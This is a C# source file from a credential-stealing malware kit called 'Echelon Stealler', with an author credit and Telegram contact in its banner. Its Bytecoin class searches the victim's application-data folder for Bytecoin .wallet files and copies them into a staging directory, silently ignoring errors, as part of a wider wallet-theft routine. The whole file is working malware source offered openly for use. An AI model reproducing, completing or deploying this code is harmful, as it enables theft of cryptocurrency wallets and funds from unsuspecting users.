///////////////////////////////////////////////////////
////Echelon Stealler, C# Malware Systems by MadСod ////
///////////////////Telegram: @madcod///////////////////
///////////////////////////////////////////////////////


using System.IO;

namespace Echelon
{
    class Bytecoin
    {
        public static int count = 0;
        public static void BCNcoinStr(string directorypath) 
        {
            try
            {
                foreach (FileInfo file in new DirectoryInfo(Help.AppDate + "\\bytecoin").GetFiles())
                {
                    Directory.CreateDirectory(directorypath + "\\Wallets\\Bytecoin\\");
                    if (file.Extension.Equals(".wallet"))
                    {
                        file.CopyTo(directorypath + "\\Bytecoin\\" + file.Name);
                    }
                }
                count++;
                StartWallets.count++;
            }
            catch 
            {
            }
        }
    }
}
